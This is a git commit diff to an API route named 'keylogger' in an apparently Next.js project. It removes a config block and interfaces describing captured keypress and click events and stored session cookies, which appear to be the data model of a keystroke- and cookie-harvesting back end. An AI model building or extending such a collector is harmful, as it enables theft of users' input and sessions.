a6fd78fa3caa7b0f1c30412835f75943998edfa1
Mihnea-Octavian Manolache <mihnea.manolache@yahoo.com>
2024-12-04 17:26:26 +0200

    Remove unused constant in api route

--- src/app/api/keylogger/route.ts
+++ src/app/api/keylogger/route.ts
@@ -2,33 +2,6 @@ import { type NextRequest, NextResponse } from 'next/server';
 import dns from 'node:dns/promises';
 import { put, list, type ListBlobResult } from '@vercel/blob';
 
-export const config = {
-  api: {
-    externalResolver: true,
-  },
-};
-
-/**
- * Interface representing a session's metadata.
- */
-export interface ISession {
-    /** Unique identifier for the session. */
-    id:             string;
-    /** Timestamp when the session was created. */
-    created_at:     Date;
-    /** User agent string of the client browser. */
-    user_agent:     string;
-    /** Persistent session cookie. */
-    session_cookie: string;
-}
-
-export interface IPayload {
-    /** Type of event captured. */
-    type:   "keypress" | "enter" | "click";
-    /** Value of the captured event. */
-    value:  string;
-}
-
 export async function GET(_: NextRequest) {
     const response: ListBlobResult = await list();
     return NextResponse.json(
